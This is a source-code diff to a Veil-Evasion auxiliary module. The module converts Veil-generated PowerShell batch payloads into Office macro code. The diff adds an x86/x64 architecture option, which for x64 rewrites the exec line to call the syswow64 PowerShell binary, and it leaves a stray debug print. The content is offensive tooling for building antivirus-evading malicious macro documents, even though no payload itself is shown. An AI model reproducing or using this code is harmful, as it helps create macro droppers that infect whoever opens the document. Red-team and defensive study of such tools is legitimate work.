@@ -1,7 +1,7 @@
 """
 
 This module is designed to take a windows powershell batch script made by
-Veil-Evasion and convert it to a macro
+Veil-Evasion powershell/virtual module and convert it to a macro
 
 module by @christruncer but original conversion code was developed by
 khr040sh.  Blog post available at:
@@ -16,13 +16,14 @@ class Payload:
 
     def __init__(self):
         # required options
-        self.description = "Auxiliary script which converts a powershell batch script to macro code"
+        self.description = "Auxiliary script which converts Veil's powershell batch script to macro code"
         self.language = "powershell"
         self.rating = "Normal"
         self.extension = "txt"
 
         self.required_options = {
-            "POSH_BATCH": ["", "Path to a powershell batch script"]
+            "POSH_BATCH": ["", "Path to a powershell batch script"],
+            "ARCHITECTURE": ["x86", "x86 or x64"]
             }
 
     def generate(self):
@@ -83,7 +84,11 @@ class Payload:
         holder = []
         str1 = ''
         str2 = ''
-        str1 = varstr + ' = "' + instr[:54] + '"'
+        print self.required_options['ARCHITECTURE']
+        if varstr == "exec" and self.required_options['ARCHITECTURE'][0] == "x64":
+            str1 = varstr + ' = "C:\\Windows\\syswow64\\windowspowershell\\v1.0\\' + instr[:54] + '"'
+        else:
+            str1 = varstr + ' = "' + instr[:54] + '"'
         for i in xrange(54, len(instr), 48):
             holder.append(varstr + ' = ' + varstr +' + "' + instr[i:i+48])
             str2 = '"\r\n'.join(holder)
